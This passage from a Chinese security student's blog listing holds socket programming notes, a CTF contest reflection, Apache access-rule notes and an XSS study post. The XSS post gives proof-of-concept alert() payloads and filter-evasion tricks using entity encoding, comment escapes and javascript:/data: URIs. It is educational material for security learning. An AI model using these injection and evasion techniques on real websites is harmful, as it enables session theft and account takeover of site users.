<li><a href="https://www.bertramc.cn/2017/06/16/34.html">【挖坟】PHPCMS v9.6.0 SQL注入</a></li>
<li><a href="http://www.venenof.com/index.php/archives/347/">PHPCMS V9.6.0注入分析</a></li>
</ul>
<h2 id="0x05-题外话"><a href="#0x05-题外话" class="headerlink" title="0x05 题外话"></a>0x05 题外话</h2><p>比赛求各位大佬们轻虐!</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/socket-structures/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/socket-structures/index.html" itemprop="url">
                  socket网络编程笔记 与地址相关的常见struct
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-11-27 20:51:20" itemprop="dateCreated datePublished" datetime="2017-11-27T20:51:20+08:00">2017-11-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h3 id="addrinfo"><a href="#addrinfo" class="headerlink" title="addrinfo"></a>addrinfo</h3><pre><code>struct addrinfo {
    int              ai_flags;     // AI_PASSIVE, AI_CANONNAME, etc.
    int              ai_family;    // AF_INET(ipv4), AF_INET6(ipv6), AF_UNSPEC
    int              ai_socktype;  // SOCK_STREAM, SOCK_DGRAM
    int              ai_protocol;  // use 0 for &quot;any&quot;
    size_t           ai_addrlen;   // size of ai_addr in bytes
    struct sockaddr *ai_addr;      // struct sockaddr_in or _in6
    char            *ai_canonname; // full canonical hostname
    struct addrinfo *ai_next;      // linked list, next node
};
</code></pre><ul>
<li>获取此结构的函数:getaddrinfo()</li>
</ul>
<h3 id="sockaddr"><a href="#sockaddr" class="headerlink" title="sockaddr"></a>sockaddr</h3><pre><code>struct sockaddr {
    unsigned short    sa_family;    // address family, AF_xxx
    char              sa_data[14];  // 14 bytes of protocol address,contains a destination address and port number for the socket. 
}; 
</code></pre><h3 id="sockaddr-in"><a href="#sockaddr-in" class="headerlink" title="sockaddr_in"></a>sockaddr_in</h3><pre><code>// (IPv4 only--see struct sockaddr_in6 for IPv6)
struct sockaddr_in {
    short int          sin_family;  // Address family, AF_INET
    unsigned short int sin_port;    // Port number
    struct in_addr     sin_addr;    // Internet address
    unsigned char      sin_zero[8]; // Same size as struct sockaddr
};
</code></pre><ul>
<li><strong>sin_zero</strong>(which is included to pad the structure to the length of a struct sockaddr) should be set to all zeros with the function <strong>memset()</strong></li>
<li><strong>sin_family</strong> corresponds to <strong>sa_family</strong> in a struct <strong>sockaddr</strong> and should be set to <strong>_AF_INET_</strong>.</li>
<li>the <strong>sin_port</strong> must be in <strong><em>Network Byte Order</em></strong> (by using <strong>htons()</strong>!)</li>
</ul>
<h3 id="in-addr"><a href="#in-addr" class="headerlink" title="in_addr"></a>in_addr</h3><pre><code>// (IPv4 only--see struct in6_addr for IPv6)
// Internet address (a structure for historical reasons)
struct in_addr {
    uint32_t s_addr; // that&apos;s a 32-bit int (4 bytes)
};
</code></pre><ul>
<li>used to be a union</li>
<li>referes to the 4-byte IP address</li>
</ul>
<h3 id="structs-in-ipv6-similar"><a href="#structs-in-ipv6-similar" class="headerlink" title="structs in ipv6(similar)"></a>structs in ipv6(similar)</h3><pre><code>// (IPv6 only--see struct sockaddr_in and struct in_addr for IPv4)
struct sockaddr_in6 {
    u_int16_t       sin6_family;   // address family, AF_INET6
    u_int16_t       sin6_port;     // port number, Network Byte Order
    u_int32_t       sin6_flowinfo; // IPv6 flow information
    struct in6_addr sin6_addr;     // IPv6 address
    u_int32_t       sin6_scope_id; // Scope ID
};
struct in6_addr {
    unsigned char   s6_addr[16];   // IPv6 address
};
</code></pre><h3 id="sockaddr-storage-a-structure-large-enough-to-hold-both-ipv4-and-ipv6-structrues"><a href="#sockaddr-storage-a-structure-large-enough-to-hold-both-ipv4-and-ipv6-structrues" class="headerlink" title="sockaddr_storage (a structure large enough to hold both ipv4 and ipv6 structrues)"></a>sockaddr_storage (a structure large enough to hold both ipv4 and ipv6 structrues)</h3><pre><code>struct sockaddr_storage {
    sa_family_t  ss_family;     // address family
    // all this is padding, implementation specific, ignore it:
    char      __ss_pad1[_SS_PAD1SIZE];
    int64_t   __ss_align;
    char      __ss_pad2[_SS_PAD2SIZE];
};
</code></pre><ul>
<li>you can cast it to a struct sockaddr_in or struct sockaddr_in6 if you wanna</li>
</ul>
<h2 id="manipulate-IP-address"><a href="#manipulate-IP-address" class="headerlink" title="manipulate IP address"></a>manipulate IP address</h2><h3 id="inet-pton-cast-string-form-to-binary-form"><a href="#inet-pton-cast-string-form-to-binary-form" class="headerlink" title="inet_pton(): cast string form to binary form"></a>inet_pton(): cast string form to binary form</h3><pre><code>struct sockaddr_in sa; // IPv4
struct sockaddr_in6 sa6; // IPv6
inet_pton(AF_INET, &quot;10.12.110.57&quot;, &amp;(sa.sin_addr)); // IPv4
inet_pton(AF_INET6, &quot;2001:db8:63b3:1::3490&quot;, &amp;(sa6.sin6_addr)); // IPv6
</code></pre><ul>
<li>old way: <strong>_inet_addr()_</strong> <strong>_inet_aton()_</strong> (not compatible with IPv6)</li>
</ul>
<h3 id="inet-ntop-cast-binary-from-to-string-from"><a href="#inet-ntop-cast-binary-from-to-string-from" class="headerlink" title="inet_ntop(): cast binary from to string from"></a>inet_ntop(): cast binary from to string from</h3><pre><code>// IPv4:
char ip4[INET_ADDRSTRLEN];
struct sockaddr_in sa;
// space to hold the IPv4 string
// pretend this is loaded with something
inet_ntop(AF_INET, &amp;(sa.sin_addr), ip4, INET_ADDRSTRLEN);
printf(&quot;The IPv4 address is: %s\n&quot;, ip4);
// IPv6:
char ip6[INET6_ADDRSTRLEN]; // space to hold the IPv6 string
struct sockaddr_in6 sa6;
// pretend this is loaded with something
inet_ntop(AF_INET6, &amp;(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN);
printf(&quot;The address is: %s\n&quot;, ip6);
</code></pre><blockquote>
<p>only work with numeric IP addresses,won’t do any nameserver DNS lookup on a hostname. Use <strong><em>getaddrinfo()</em></strong> to do that.</p>
</blockquote>
<h2 id="Other-Notes"><a href="#Other-Notes" class="headerlink" title="Other Notes"></a>Other Notes</h2><ul>
<li><strong><em>Layered Network Model</em></strong><ul>
<li>Seven layers<ol>
<li><strong>Application</strong> (应用层)</li>
<li><strong>Presentaion</strong> (表示层)</li>
<li><strong>Session</strong> (会话层)</li>
<li><strong>Transport</strong> (传输层)</li>
<li><strong>Network</strong> (网络层)</li>
<li><strong>Data Link</strong> (数据链路层)</li>
<li><strong>Physical</strong> (物理层)</li>
</ol>
</li>
<li>Simplified Four Layers<ul>
<li><strong>Application Layer</strong>(应用层:telnet,ftp,etc.)</li>
<li><strong>Host-to-Host Layer</strong>(传输层:TCP UDP)</li>
<li><strong>Internet Layer</strong>(网络互连层:IP and routing)</li>
<li><strong>Network Access Layer</strong>(主机到网络层:Ethernet,wi-fi,whatever)</li>
</ul>
</li>
</ul>
</li>
<li>Some common IP addresses<ul>
<li>10.x.x.x<ul>
<li>only be used either of fully disconnected networks or the networks behind firewalls</li>
</ul>
</li>
<li>192.168.x.x x in range(0,256)</li>
<li>172.y.x.x y in rarnge(16,32)</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/tianyi6/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/tianyi6/index.html" itemprop="url">
                  天翼杯线下赛总结
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-10-27 08:19:41" itemprop="dateCreated datePublished" datetime="2017-10-27T08:19:41+08:00">2017-10-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>昨天打了场天翼杯线下赛，也算是第二次打线下赛了吧，跟着学长们混最后拿到了个第五名。比赛还是让萌新受益匪浅，也充分了解到自己的不足之处。欸，菜的一笔还得继续努力。那就写这篇文章重点来记录一下自己参加这次线下赛的感想吧。</p>
</blockquote>
<h2 id="1-Windows服务器管理方面不擅长"><a href="#1-Windows服务器管理方面不擅长" class="headerlink" title="1.Windows服务器管理方面不擅长"></a>1.Windows服务器管理方面不擅长</h2><p>之前较少接触windows服务器，这次线下赛有一台装有struts的windows服务器，经检测确实存在struts2046漏洞可以利用。然而获取shell之后需要获取远程桌面才能得到flag，由于windows的cmd玩的不是很熟所以试了半天还是gg了。。。。。。所以以后还是要<strong>拓展知识面</strong>。</p>
<h2 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h2><p>现场审计phpcms的漏洞，提前准备的一些POC由于没有仔细用过结果用的时候有的库没装。。。。试了半天也没试出来。。。。还是太菜了。。。。以后还是要多学学代码审计相关的知识，至少做到熟练一些主流cms的架构。</p>
<h2 id="3-linux运维"><a href="#3-linux运维" class="headerlink" title="3.linux运维"></a>3.linux运维</h2><p>有些重要命令还是不熟。。。。。。以后还得多学学。。。。。。</p>
<blockquote>
<p>总之个人认为线下赛还是对个人能力的全方位的考验，需要有扎实的功底和渗透运维技巧。菜的一笔。。。。还是去好好学习吧。。。。。。</p>
</blockquote>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/xss/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/xss/index.html" itemprop="url">
                  XSS
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-27 12:08:09" itemprop="dateCreated datePublished" datetime="2017-08-27T12:08:09+08:00">2017-08-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="整理sus沙龙以及xman的前端ppt的笔记"><a href="#整理sus沙龙以及xman的前端ppt的笔记" class="headerlink" title="整理sus沙龙以及xman的前端ppt的笔记"></a>整理sus沙龙以及xman的前端ppt的笔记</h4><hr>
<h2 id="0x01-JS能用来做什么"><a href="#0x01-JS能用来做什么" class="headerlink" title="0x01 JS能用来做什么"></a>0x01 JS能用来做什么</h2><ul>
<li>请求资源</li>
<li>提交表单</li>
<li>修改html</li>
<li>响应事件</li>
</ul>
<hr>
<h2 id="0x02-一个含有js的html文件是怎样变成一个动态网页的"><a href="#0x02-一个含有js的html文件是怎样变成一个动态网页的" class="headerlink" title="0x02 一个含有js的html文件是怎样变成一个动态网页的"></a>0x02 一个含有js的html文件是怎样变成一个动态网页的</h2><p><strong>浏览器解析方式</strong> 在HTML中有五类元素 <em> 语言的解析一般分为<code>词法分析（lexical analysis）</code>和<code>语法分析（Syntax analysis）</code>两个阶段，WebKit中的 html解析也不例外，本文主要讨论词法分析。 </em> 词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分词。 <em> 在WebKit中，有两个类，同词法分析密切相关，它是<code>HTMLToken</code>和<code>HTMLTokenizer</code>类，可以简单将HTMLToken类理 解 为标记，HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的<code>标记（HTMLToken）</code>，然后由 语法解析器进行下一步的分析。 \</em> 在XML/HTML的文档解析中，token这个词经常用到，我将其理解为一个<code>有完整语义的单元（也就是分出来的 “词”）</code>，一个元素通常对应于3 个 token，一个是<code>元素的起始标签</code>，一个是<code>元素的结束标签</code>，一个是元素的<code>内容</code>，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。 * 除了<code>起始标签(StartTag)</code>、<code>结束标签(EndTag)</code>和<code>元素内容（Character）</code>，HTML标签还有<code>DOCTYPE（文档类 型）</code>,<code>Comment（注释）</code>，<code>Uninitialized（默认类型）</code>和<code>EndOfFile（文档结束）</code>等类型，参见HTMLToken.h中的 Type枚举 <strong>在HTML中有五类元素：</strong></p>
<ol>
<li><strong>空元素(Void elements)</strong>，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li>
<li><strong>原始文本元素(Raw text elements)</strong>，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li>
<li><strong>RCDATA元素(RCDATA elements)</strong>，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li>
<li><strong>外部元素(Foreign elements)</strong>，例如<code>MathML命名空间</code>或者<code>SVG命名空间</code>的元素</li>
<li><strong>基本元素(Normal elements)</strong>，即除了以上4种元素以外的元素</li>
</ol>
<p><strong>五类元素的区别如下：</strong></p>
<ol>
<li><strong>空元素</strong>，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li>
<li><strong>原始文本元素</strong>，可以容纳文本。</li>
<li><strong>RCDATA元素</strong>，可以容纳文本和字符引用。 （&amp;#60）</li>
<li><strong>外部元素</strong>，可以容纳文本、字符引用、CDATA段、其他元素和注释</li>
<li><strong>基本元素</strong>，可以容纳文本、字符引用、其他元素和注释</li>
</ol>
<blockquote>
<p>如果我们回头看HTML解析器的规则，其中有一种可以容纳字符引用的情况是“RCDATA状态中的字符引用”。 这意味着在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>标签中的字符引用会被HTML解析器解码。这里要再提醒一次，在解析这些字符 引用的过程中不会进入“标签开始状态”。这样就可以解释问题5了。另外，对RCDATA有个特殊的情况。在浏 览器解析RCDATA元素的过程中，解析器会进入<code>RCDATA状态</code>。在这个状态中，如果遇到<code>&lt;</code>字符，它会转 换到<code>RCDATA小于号状态</code>。如果<code>&lt;</code>字符后没有紧跟着<code>/</code>和对应的标签名，解析器会转换回<code>RCDATA状 态</code>。这意味着在RCDATA元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是 标签的就是<code>&lt;/textarea&gt;</code>或者<code>&lt;/title&gt;</code>。当然，这要看开始标签是哪一个。因此，在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;”</code>的内容中不会创建标签，就不会有脚本能够执行。</p>
</blockquote>
<hr>
<h2 id="0x03-XSS是什么"><a href="#0x03-XSS是什么" class="headerlink" title="0x03 XSS是什么"></a>0x03 XSS是什么</h2><p>恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.通过xss可以进行一系列的越权操作，或者窃取用户cookies从而登录用户账户。 <strong>说白了就是 插js, html耍流氓</strong></p>
<hr>
<h2 id="0x04-XSS的分类"><a href="#0x04-XSS的分类" class="headerlink" title="0x04 XSS的分类"></a>0x04 XSS的分类</h2><p><strong>反射型XSS：</strong></p>
<ul>
<li>恶意代码通常存在于URL中</li>
<li>需要用户去点击相应的链接才会触发，隐蔽性较差</li>
<li>而且，而且可能会被浏览器的XSS Filter干掉</li>
<li>流程：输入–输出</li>
</ul>
<p><strong>存储型XSS：</strong></p>
<ul>
<li>恶意代码通常存在于数据库中</li>
<li>用户浏览被植入payload的“正常页面”时即可触发，隐蔽性较 强，成功率高，稳定性好。</li>
<li>流程：输入–进入数据库–取出数据库–输出</li>
</ul>
<hr>
<h2 id="0x05-XSS漏洞挖掘技巧"><a href="#0x05-XSS漏洞挖掘技巧" class="headerlink" title="0x05 XSS漏洞挖掘技巧"></a>0x05 XSS漏洞挖掘技巧</h2><ul>
<li>输入在标签间的情况：测试<code>&lt;&gt;</code>是否被过滤或转义，若无则直接<code>&lt;img src=1 onerror=alert(1)&gt;</code></li>
<li>输入在script标签内：我们需要在保证内部JS语法正确的前提下，去插入我们的payload。 如果我们的输出在字符串内部，测试字符串能否被闭合。如果我 们无法闭合包裹字符串的引号，这个点就很难利用了。 可能的解决方案：可以控制两处输入且\可用、存在宽字节</li>
<li>输入在HTML属性内：首先查看属性是否有双引号包裹、没有则直接添加新的事件属性； 有双引号包裹则测试双引号是否可用，可用则闭合属性之后添加 新的事件属性； TIP：HTML的属性，如果被进行HTML实体编码(形如<code>&amp;#039</code>;<code>&amp;#x27</code>)，那么 HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编 码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构 造payload。</li>
<li>输出在JS中，空格被过滤：使用<code>/**/</code>代替空格。</li>
<li>输出在JS注释中： 设法插入换行符<code>%0A，</code>使其逃逸出来。</li>
<li>输入在JS字符串内： 可以利用JS的十六进制、八进制、unicode编码。</li>
<li>输入在src/href/action等属性内：可以利用<code>javascript:alert(1)</code>，以及 <code>data:text/html;base64;</code>加上base64编码后的HTML。</li>
<li>onxxx事件的js脚本可以用html编码来绕过对某些关键字的过滤。</li>
<li>Chrome下iframe自身的弹框姿势：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(2)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert(4)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">*   坑点之自带HtmlEncode(转义)功能的标签：</span><br><span class="line">```html</span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当我们的XSS payload位于这些标签中间时，并不会解析，除非我们把它们闭合掉。</p>
<hr>
<h2 id="0x06-XSS练习网站、资料"><a href="#0x06-XSS练习网站、资料" class="headerlink" title="0x06 XSS练习网站、资料"></a>0x06 XSS练习网站、资料</h2><ul>
<li><a href="http://xss-quiz.int21h.jp/">xss-quiz</a></li>
<li><a href="https://alf.nu/alert1">alert(1) to win</a></li>
<li><a href="http://prompt.ml/0">prompt(1) to win</a></li>
<li><a href="http://html5sec.org/">html5 Security Cheatsheet</a></li>
<li><a href="http://ssv.sebug.net/XSS_Cheat_Sheet">XSS Cheatsheet</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS Filter Evasion Cheat Sheet</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/apache-order-allow/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/apache-order-allow/index.html" itemprop="url">
                  Apache Order Allow
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-11 18:02:02" itemprop="dateCreated datePublished" datetime="2017-08-11T18:02:02+08:00">2017-08-11</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。      所以，最常用的是： Order Deny,Allow Allow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。这个主要是用来确保或者覆盖上级目录的设置，开放所有内容的访问权。 按照上面的解释，下面的设定是无条件禁止访问： Order Allow,Deny Deny from All 如果要禁止部分内容的访问，其他的全部开放： Order Deny,Allow Deny from ip1 ip2 或者 Order Allow,Deny Allow from all Deny from ip1 ip2 apache会按照order决定最后使用哪一条规则，比如上面的第二种方式，虽然第二句allow允许了访问，但由于在order中allow不是最后规则，因此还需要看有没有deny规则，于是到了第三句，符合ip1和ip2的访问就被禁止了。注意，order决定的“最后”规则非常重要，下面是两个错误的例子和改正方式： Order Deny,Allow Allow from all Deny from domain.org 错误：想禁止来自domain.org的访问，但是deny不是最后规则，apache在处理到第二句allow的时候就已经匹配成功，根本就不会去看第三句。 解决方法：Order Allow,Deny，后面两句不动，即可。 Order Allow,Deny Allow from ip1 Deny from all 错误：想只允许来自ip1的访问，但是，虽然第二句中设定了allow规则，由于order中deny在后，所以会以第三句deny为准，而第三句的范围中又明显包含了ip1（all include ip1），所以所有的访问都被禁止了。 解决方法一：直接去掉第三句。 解决方法二： Order Deny,Allow Deny from all Allow from ip1 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 